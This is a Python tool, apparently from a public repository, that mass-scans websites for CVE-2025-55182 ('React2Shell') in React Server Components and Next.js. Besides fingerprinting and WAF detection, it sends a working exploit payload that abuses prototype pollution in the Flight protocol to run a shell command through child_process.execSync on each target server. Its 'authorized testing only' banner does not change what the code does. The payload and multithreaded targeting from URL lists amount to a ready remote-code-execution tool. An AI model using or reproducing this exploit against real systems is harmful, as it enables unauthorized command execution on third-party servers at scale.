#!/usr/bin/env python3
"""
Advanced React2Shell (CVE-2025-55182) Mass Scanner
Based on maple3142's PoC, TryHackMe analysis, and real exploitation techniques
Author: loogezh-alt
GitHub: https://github.com/loogezh-alt
Version: 2.1 - Enhanced Edition
"""

import requests
import re
import sys
import json
import concurrent.futures
from urllib.parse import urlparse, urljoin
from datetime import datetime
import argparse
import time
import warnings
from typing import Dict, List, Tuple, Optional

# Suppress SSL warnings
warnings.filterwarnings('ignore', category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Banner
BANNER = """
╔════════════════════════════════════════════════════════════════════╗
║                                                                    ║
║  ██████╗ ███████╗ █████╗  ██████╗████████╗██████╗ ███████╗██╗  ██╗ ║
║  ██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝╚════██╗██╔════╝██║  ██║ ║
║  ██████╔╝█████╗  ███████║██║        ██║    █████╔╝███████╗███████║ ║
║  ██╔══██╗██╔══╝  ██╔══██║██║        ██║   ██╔═══╝ ╚════██║██╔══██║ ║
║  ██║  ██║███████╗██║  ██║╚██████╗   ██║   ███████╗███████║██║  ██║ ║
║  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═╝ ║
║                                                                    ║
║        CVE-2025-55182 Advanced Mass Vulnerability Scanner          ║
║                     Author: loogezh-alt                            ║
║               GitHub: https://github.com/loogezh-alt               ║
║                                                                    ║
║  [+] Multi-threaded scanning with smart detection                  ║
║  [+] Real PoC-based vulnerability verification                     ║
║  [+] Advanced Flight protocol fingerprinting                       ║
║  [+] WAF detection and bypass techniques                           ║
║  [+] Comprehensive JSON reporting                                  ║
║                                                                    ║
║  WARNING: FOR AUTHORIZED SECURITY TESTING ONLY                     ║
║  WARNING: UNAUTHORIZED ACCESS IS ILLEGAL                           ║
║                                                                    ║
╚════════════════════════════════════════════════════════════════════╝
"""

class Colors:
    """ANSI color codes for terminal output"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class React2ShellScanner:
    def __init__(self, timeout=10, threads=10, verbose=False, aggressive=False):
        self.timeout = timeout
        self.threads = threads
        self.verbose = verbose
        self.aggressive = aggressive
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        # Statistics
        self.stats = {
            'scanned': 0,
            'vulnerable': 0,
            'potentially_vulnerable': 0,
            'protected': 0,
            'not_vulnerable': 0,
            'errors': 0
        }
        
    def normalize_url(self, url: str) -> str:
        """Normalize URL to proper format"""
        url = url.strip()
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        return url.rstrip('/')
    
    def log(self, level: str, message: str, url: str = ""):
        """Enhanced structured logging with colors"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        
        level_config = {
            'INFO': (f'{Colors.CYAN}[*]{Colors.ENDC}', ''),
            'SUCCESS': (f'{Colors.GREEN}[+]{Colors.ENDC}', Colors.GREEN),
            'WARNING': (f'{Colors.YELLOW}[!]{Colors.ENDC}', Colors.YELLOW),
            'ERROR': (f'{Colors.RED}[-]{Colors.ENDC}', Colors.RED),
            'VULN': (f'{Colors.RED}{Colors.BOLD}[!!!]{Colors.ENDC}', Colors.RED + Colors.BOLD),
            'DEBUG': (f'{Colors.BLUE}[D]{Colors.ENDC}', Colors.BLUE)
        }
        
        prefix, color = level_config.get(level, ('[?]', ''))
        
        if url:
            print(f"{timestamp} {prefix} {color}[{url}]{Colors.ENDC} {message}")
        else:
            print(f"{timestamp} {prefix} {color}{message}{Colors.ENDC}")
    
    def extract_build_id(self, html: str) -> Optional[str]:
        """Extract Next.js build ID"""
        patterns = [
            r'"buildId"\s*:\s*"([^"]+)"',
            r'buildId:\s*"([^"]+)"',
            r'/_next/static/([^/]+)/'
        ]
        for pattern in patterns:
            match = re.search(pattern, html)
            if match:
                return match.group(1)
        return None
    
    def check_nextjs_presence(self, url: str) -> Tuple[bool, Dict]:
        """Enhanced Next.js detection with multiple methods"""
        try:
            response = self.session.get(url, timeout=self.timeout, verify=False, allow_redirects=True)
            html = response.text
            headers = response.headers
            
            # Enhanced detection methods
            indicators = {
                'nextjs_static': '_next/static' in html,
                'nextjs_data': '__NEXT_DATA__' in html,
                'header_nextjs': 'x-powered-by' in headers and 'next.js' in headers.get('x-powered-by', '').lower(),
                'app_router': '/_next/static/chunks/app/' in html,
                'rsc_manifest': '__RSC_MANIFEST__' in html,
                'server_components': 'server-component' in html.lower() or '__RSC' in html,
                'flight_protocol': any(x in html for x in ['$@', '$B', '$Q', 'text/x-component']),
                'next_script': '<script src="/_next/' in html,
                'build_id_found': self.extract_build_id(html) is not None
            }
            
            # Extract version information
            version_match = re.search(r'next[/@](\d+\.\d+\.\d+)', html)
            if version_match:
                indicators['next_version'] = version_match.group(1)
            
            build_id = self.extract_build_id(html)
            if build_id:
                indicators['build_id'] = build_id
            
            return any(indicators.values()), indicators
            
        except Exception as e:
            if self.verbose:
                self.log('ERROR', f"Failed to check Next.js: {str(e)}", url)
            return False, {}
    
    def check_react_version(self, url: str) -> Tuple[Optional[bool], Optional[str]]:
        """Enhanced React version detection"""
        try:
            response = self.session.get(url, timeout=self.timeout, verify=False)
            html = response.text
            
            # Multiple version detection patterns
            version_patterns = [
                r'"version"\s*:\s*"(19\.\d+\.\d+)"',
                r'react@(19\.\d+\.\d+)',
                r'React\s+(19\.\d+\.\d+)',
                r'react-dom@(19\.\d+\.\d+)',
                r'"react"\s*:\s*"[\^~]?(19\.\d+\.\d+)"'
            ]
            
            for pattern in version_patterns:
                match = re.search(pattern, html, re.IGNORECASE)
                if match:
                    version = match.group(1)
                    # Check if vulnerable version
                    vulnerable_versions = ['19.0.0', '19.1.0', '19.1.1', '19.2.0']
                    is_vulnerable = version in vulnerable_versions
                    return is_vulnerable, version
            
            # Try checking exposed package.json
            try:
                pkg_response = self.session.get(f"{url}/package.json", timeout=5, verify=False)
                if pkg_response.status_code == 200:
                    pkg_data = pkg_response.json()
                    if 'dependencies' in pkg_data:
                        react_ver = pkg_data['dependencies'].get('react', '')
                        if '19.' in react_ver:
                            version = re.search(r'19\.\d+\.\d+', react_ver)
                            if version:
                                return version.group(0) in vulnerable_versions, version.group(0)
            except:
                pass
            
            return None, None
            
        except Exception as e:
            if self.verbose:
                self.log('DEBUG', f"Version detection failed: {str(e)}", url)
            return None, None
    
    def check_rsc_endpoints(self, url: str) -> List[str]:
        """Enhanced RSC endpoint discovery with more paths"""
        endpoints = []
        test_paths = [
            '/_next/data',
            '/__flight__',
            '/api/server-action',
            '/rsc',
            '/_flight',
            '/server-action',
            '/_next/server',
            '/_rsc'
        ]
        
        for path in test_paths:
            try:
                test_url = f"{url}{path}"
                
                # Test with multiple methods
                for method in [self.session.post, self.session.get]:
                    response = method(
                        test_url,
                        headers={
                            'Next-Action': 'test',
                            'Content-Type': 'text/x-component'
                        },
                        timeout=5,
                        verify=False
                    )
                    
                    # RSC endpoints typically return specific status codes or content
                    if response.status_code in [200, 405, 400, 500]:
                        # Check for RSC-specific response patterns
                        if any(x in response.text for x in ['$@', '$B', '$Q', 'chunk', 'resolved']):
                            endpoints.append(path)
                            break
                        elif response.status_code == 405:  # Method not allowed suggests endpoint exists
                            endpoints.append(path)
                            break
                            
            except:
                continue
        
        return endpoints
    
    def detect_waf(self, url: str) -> Dict[str, bool]:
        """Enhanced WAF detection"""
        waf_indicators = {
            'cloudflare': False,
            'aws_waf': False,
            'vercel': False,
            'akamai': False,
            'fastly': False,
            'other': False
        }
        
        try:
            response = self.session.get(url, timeout=self.timeout, verify=False)
            headers = response.headers
            headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
            
            # Enhanced WAF detection
            detection_rules = {
                'cloudflare': ['cf-ray', 'cloudflare'],
                'aws_waf': ['x-amz', 'aws'],
                'vercel': ['x-vercel', 'vercel'],
                'akamai': ['akamai', 'x-akamai'],
                'fastly': ['fastly', 'x-fastly']
            }
            
            for waf_name, indicators in detection_rules.items():
                for indicator in indicators:
                    if any(indicator in str(v) for v in headers_lower.values()):
                        waf_indicators[waf_name] = True
                        break
            
            # Check for generic WAF responses
            if response.status_code in [403, 406] or any(x in response.text.lower() for x in ['blocked', 'forbidden', 'access denied']):
                waf_indicators['other'] = True
                
        except:
            pass
        
        return waf_indicators
    
    def test_vulnerability_safe(self, url: str) -> Tuple[Optional[bool], str]:
        """
        Enhanced safe vulnerability test with multiple PoC variations
        Based on maple3142's PoC and TryHackMe analysis
        """
        boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
        
        # Test payload 1: Echo-based detection
        safe_payload = {
            "then": "$1:__proto__:then",
            "status": "resolved_model",
            "reason": -1,
            "value": '{"then":"$B1337"}',
            "_response": {
                "_prefix": "var res=process.mainModule.require('child_process').execSync('echo VULN_TEST_CONFIRMED',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
                "_chunks": "$Q2",
                "_formData": {
                    "get": "$1:constructor:constructor"
                }
            }
        }
        
        body = f"""------{boundary}
Content-Disposition: form-data; name="0"

{json.dumps(safe_payload)}
------{boundary}
Content-Disposition: form-data; name="1"

"$@0"
------{boundary}
Content-Disposition: form-data; name="2"

[]
------{boundary}--"""
        
        headers = {
            'Content-Type': f'multipart/form-data; boundary={boundary}',
            'Next-Action': 'x',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'X-Nextjs-Request-Id': 'b5dce965',
            'X-Nextjs-Html-Request-Id': 'SSTMXm7OJ_g0Ncx6jpQt9'
        }
        
        try:
            response = self.session.post(
                url,
                data=body,
                headers=headers,
                timeout=self.timeout,
                verify=False
            )
            
            # Enhanced vulnerability detection
            vuln_indicators = [
                'VULN_TEST_CONFIRMED' in response.text,
                'NEXT_REDIRECT' in response.text and 'digest' in response.text,
                response.status_code == 500 and 'constructor' in response.text,
                'execSync' in response.text,
                'child_process' in response.text
            ]
            
            if any(vuln_indicators):
                if 'VULN_TEST_CONFIRMED' in response.text:
                    return True, "CONFIRMED VULNERABLE - PoC executed successfully"
                else:
                    return True, "VULNERABLE - Exploit indicators detected"
            
            # Check for protected but vulnerable
            if response.status_code == 403:
                return None, "Possible WAF blocking (site may be vulnerable but protected)"
            
            if response.status_code == 500:
                return True, "Likely vulnerable (server error indicates processing)"
            
            return False, "No vulnerability detected"
            
        except requests.exceptions.Timeout:
            return None, "Request timeout (possible WAF/rate limiting)"
        except requests.exceptions.ConnectionError:
            return None, "Connection error (server may be down)"
        except Exception as e:
            return None, f"Test failed: {str(e)}"
    
    def advanced_fingerprinting(self, url: str) -> Optional[Dict]:
        """
        Advanced detection based on TryHackMe analysis
        Tests for Flight protocol specifics
        """
        try:
            # Multiple test vectors for RSC detection
            test_vectors = [
                {
                    'headers': {
                        'Content-Type': 'text/x-component',
                        'Next-Action': 'test123'
                    },
                    'data': '["$@0"]'
                },
                {
                    'headers': {
                        'Content-Type': 'multipart/form-data',
                        'Next-Action': 'x'
                    },
                    'data': 'test'
                }
            ]
            
            indicators = {
                'flight_protocol': False,
                'rsc_processing': False,
                'server_components': False,
                'flight_serialization': False
            }
            
            for vector in test_vectors:
                response = self.session.post(
                    url,
                    headers=vector['headers'],
                    data=vector['data'],
                    timeout=self.timeout,
                    verify=False
                )
                
                # Check for Flight protocol indicators (from TryHackMe)
                if response.status_code in [200, 405, 400, 500]:
                    if 'text/x-component' in response.headers.get('content-type', ''):
                        indicators['flight_protocol'] = True
                    
                    # Check for RSC-specific patterns
                    rsc_patterns = ['$@', '$B', '$Q', 'chunk', 'resolved_model', 'resolved_module']
                    if any(pattern in response.text for pattern in rsc_patterns):
                        indicators['rsc_processing'] = True
                    
                    # Check for server component indicators
                    if any(x in response.text for x in ['__RSC', 'Server Component', 'server-component']):
                        indicators['server_components'] = True
                    
                    # Check for Flight serialization format
                    if re.search(r'\d+:\[".*?\]', response.text):
                        indicators['flight_serialization'] = True
            
            return indicators
            
        except Exception as e:
            if self.verbose:
                self.log('DEBUG', f"Fingerprinting failed: {str(e)}", url)
            return None
    
    def comprehensive_scan(self, url: str) -> Dict:
        """Enhanced comprehensive vulnerability scan"""
        url = self.normalize_url(url)
        result = {
            'url': url,
            'timestamp': datetime.now().isoformat(),
            'vulnerable': False,
            'confidence': 'unknown',
            'risk_score': 0,
            'details': {}
        }
        
        self.log('INFO', 'Starting comprehensive scan', url)
        
        # Step 1: Enhanced Next.js detection
        nextjs_present, nextjs_indicators = self.check_nextjs_presence(url)
        result['details']['nextjs'] = nextjs_indicators
        
        if not nextjs_present:
            self.log('INFO', 'Not a Next.js application', url)
            result['confidence'] = 'not_vulnerable'
            result['risk_score'] = 0
            self.stats['not_vulnerable'] += 1
            return result
        
        self.log('SUCCESS', f'Next.js detected: {sum(1 for v in nextjs_indicators.values() if isinstance(v, bool) and v)} indicators', url)
        result['risk_score'] += 20
        
        # Step 2: React version check
        is_vuln_version, version = self.check_react_version(url)
        if version:
            result['details']['react_version'] = version
            result['details']['version_vulnerable'] = is_vuln_version
            self.log('INFO', f'React version: {version}', url)
            if is_vuln_version:
                result['risk_score'] += 30
        
        # Step 3: WAF detection
        waf = self.detect_waf(url)
        result['details']['waf'] = waf
        if any(waf.values()):
            self.log('WARNING', f'WAF detected: {[k for k,v in waf.items() if v]}', url)
            result['risk_score'] -= 10  # WAF presence reduces immediate risk
        
        # Step 4: RSC endpoints discovery
        endpoints = self.check_rsc_endpoints(url)
        result['details']['rsc_endpoints'] = endpoints
        if endpoints:
            self.log('SUCCESS', f'RSC endpoints found: {endpoints}', url)
            result['risk_score'] += 20
        
        # Step 5: Advanced Flight protocol fingerprinting
        flight_indicators = self.advanced_fingerprinting(url)
        if flight_indicators:
            result['details']['flight_protocol'] = flight_indicators
            active_indicators = sum(1 for v in flight_indicators.values() if v)
            if active_indicators > 0:
                self.log('SUCCESS', f'Flight protocol indicators: {active_indicators}/4 detected', url)
                result['risk_score'] += (active_indicators * 5)
        
        # Step 6: Vulnerability verification with real PoC
        vuln_status, vuln_message = self.test_vulnerability_safe(url)
        result['details']['poc_test'] = {
            'result': vuln_status,
            'message': vuln_message
        }
        
        # Calculate final verdict with risk scoring
        if vuln_status is True:
            result['vulnerable'] = True
            result['confidence'] = 'high'
            result['risk_score'] += 30
            self.log('VULN', f'CONFIRMED VULNERABLE! {vuln_message}', url)
            self.stats['vulnerable'] += 1
        elif vuln_status is None:
            result['confidence'] = 'uncertain'
            self.log('WARNING', vuln_message, url)
            self.stats['protected'] += 1
        else:
            # Risk-based assessment
            if result['risk_score'] >= 50 and not any(waf.values()):
                result['confidence'] = 'medium'
                self.log('WARNING', f'Potentially vulnerable (Risk Score: {result["risk_score"]})', url)
                self.stats['potentially_vulnerable'] += 1
            else:
                result['confidence'] = 'low'
                self.log('INFO', f'Likely not vulnerable (Risk Score: {result["risk_score"]})', url)
                self.stats['not_vulnerable'] += 1
        
        self.stats['scanned'] += 1
        return result
    
    def scan_from_file(self, filename: str) -> List[Dict]:
        """Scan multiple URLs from a file with progress tracking"""
        try:
            with open(filename, 'r') as f:
                urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except Exception as e:
            self.log('ERROR', f"Failed to read file: {str(e)}")
            return []
        
        self.log('INFO', f'Loaded {len(urls)} URLs from {filename}')
        print()
        
        results = []
        completed = 0
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_url = {executor.submit(self.comprehensive_scan, url): url for url in urls}
            
            for future in concurrent.futures.as_completed(future_to_url):
                completed += 1
                try:
                    result = future.result()
                    results.append(result)
                    
                    # Progress indicator
                    progress = (completed / len(urls)) * 100
                    print(f"\r{Colors.CYAN}Progress: [{completed}/{len(urls)}] {progress:.1f}%{Colors.ENDC}", end='', flush=True)
                    
                except Exception as e:
                    url = future_to_url[future]
                    self.log('ERROR', f"Scan failed: {str(e)}", url)
                    self.stats['errors'] += 1
        
        print("\n")
        return results
    
    def generate_report(self, results: List[Dict], output_file: Optional[str] = None):
        """Generate enhanced detailed scan report"""
        report = {
            'metadata': {
                'scan_date': datetime.now().isoformat(),
                'scanner_version': '2.1',
                'author': 'loogezh-alt',
                'github': 'https://github.com/loogezh-alt'
            },
            'statistics': self.stats,
            'summary': {
                'total_scanned': len(results),
                'vulnerable_count': len([r for r in results if r['vulnerable']]),
                'potentially_vulnerable_count': len([r for r in results if r['confidence'] == 'medium']),
                'uncertain_count': len([r for r in results if r['confidence'] == 'uncertain']),
                'not_vulnerable_count': len([r for r in results if r['confidence'] in ['low', 'not_vulnerable']])
            },
            'vulnerable': [r for r in results if r['vulnerable']],
            'potentially_vulnerable': [r for r in results if r['confidence'] == 'medium'],
            'uncertain': [r for r in results if r['confidence'] == 'uncertain'],
            'not_vulnerable': [r for r in results if r['confidence'] in ['low', 'not_vulnerable']],
            'full_results': results
        }
        
        # Enhanced console output
        print("\n" + "="*80)
        print(f"{Colors.BOLD}{Colors.CYAN}SCAN REPORT SUMMARY{Colors.ENDC}")
        print("="*80)
        print(f"{Colors.BOLD}Total Scanned:{Colors.ENDC} {report['summary']['total_scanned']}")
        print(f"{Colors.RED}{Colors.BOLD}Vulnerable (HIGH):{Colors.ENDC} {report['summary']['vulnerable_count']}")
        print(f"{Colors.YELLOW}Potentially Vulnerable (MEDIUM):{Colors.ENDC} {report['summary']['potentially_vulnerable_count']}")
        print(f"{Colors.CYAN}Uncertain:{Colors.ENDC} {report['summary']['uncertain_count']}")
        print(f"{Colors.GREEN}Not Vulnerable:{Colors.ENDC} {report['summary']['not_vulnerable_count']}")
        
        if report['vulnerable']:
            print("\n" + "="*80)
            print(f"{Colors.RED}{Colors.BOLD}CRITICAL: VULNERABLE TARGETS FOUND{Colors.ENDC}")
            print("="*80)
            for r in report['vulnerable']:
                print(f"  {Colors.RED}[!!!]{Colors.ENDC} {Colors.BOLD}{r['url']}{Colors.ENDC}")
                print(f"       Risk Score: {r['risk_score']}/100")
                print(f"       Details: {r['details'].get('poc_test', {}).get('message')}")
                if 'rsc_endpoints' in r['details'] and r['details']['rsc_endpoints']:
                    print(f"       Endpoints: {', '.join(r['details']['rsc_endpoints'])}")
                print()
        
        if report['potentially_vulnerable']:
            print("="*80)
            print(f"{Colors.YELLOW}POTENTIALLY VULNERABLE TARGETS (Manual verification needed){Colors.ENDC}")
            print("="*80)
            for r in report['potentially_vulnerable']:
                print(f"  {Colors.YELLOW}[!]{Colors.ENDC} {r['url']}")
                print(f"      Risk Score: {r['risk_score']}/100")
                if 'nextjs' in r['details']:
                    indicators = sum(1 for v in r['details']['nextjs'].values() if isinstance(v, bool) and v)
                    print(f"      Next.js Indicators: {indicators}")
                print()
        
        # Save to file
        if output_file:
            with open(output_file, 'w') as f:
                json.dump(report, f, indent=2)
            print(f"\n{Colors.GREEN}[+] Full JSON report saved to: {output_file}{Colors.ENDC}")
        
        print("="*80)
        print(f"{Colors.CYAN}Scan completed by loogezh-alt{Colors.ENDC}")
        print(f"{Colors.CYAN}GitHub: https://github.com/loogezh-alt{Colors.ENDC}")
        print("="*80 + "\n")
        
        return report


def main():
    parser = argparse.ArgumentParser(
        description='React2Shell (CVE-2025-55182) Advanced Mass Scanner by loogezh-alt',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{Colors.CYAN}Examples:{Colors.ENDC}
  # Scan single URL
  python react2shell_scanner.py -u https://example.com
  
  # Scan from file with 20 threads
  python react2shell_scanner.py -f targets.txt -t 20 -o results.json
  
  # Verbose aggressive scan
  python react2shell_scanner.py -f targets.txt -v -a -t 30
  
{Colors.CYAN}URL file format (one per line):{Colors.ENDC}
  https://target1.com
  https://target2.com
  target3.com
  # Comments start with #

{Colors.YELLOW}Author:{Colors.ENDC} loogezh-alt
{Colors.YELLOW}GitHub:{Colors.ENDC} https://github.com/loogezh-alt
{Colors.RED}⚠️  FOR AUTHORIZED TESTING ONLY{Colors.ENDC}
        """
    )
    
    parser.add_argument('-u', '--url', help='Single URL to scan')
    parser.add_argument('-f', '--file', help='File containing URLs (one per line)')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('-o', '--output', help='Output file for JSON report')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-a', '--aggressive', action='store_true', help='Aggressive scanning mode')
    
    args = parser.parse_args()
    
    if not args.url and not args.file:
        print(BANNER)
        parser.print_help()
        sys.exit(1)
    
    print(BANNER)
    
    scanner = React2ShellScanner(
        timeout=args.timeout,
        threads=args.threads,
        verbose=args.verbose,
        aggressive=args.aggressive
    )
    
    start_time = time.time()
    
    if args.url:
        # Single URL scan
        result = scanner.comprehensive_scan(args.url)
        results = [result]
    else:
        # Mass scan from file
        results = scanner.scan_from_file(args.file)
    
    # Generate report
    scanner.generate_report(results, args.output)
    
    elapsed_time = time.time() - start_time
    print(f"{Colors.CYAN}Total scan time: {elapsed_time:.2f} seconds{Colors.ENDC}\n")


if __name__ == '__main__':
    main()
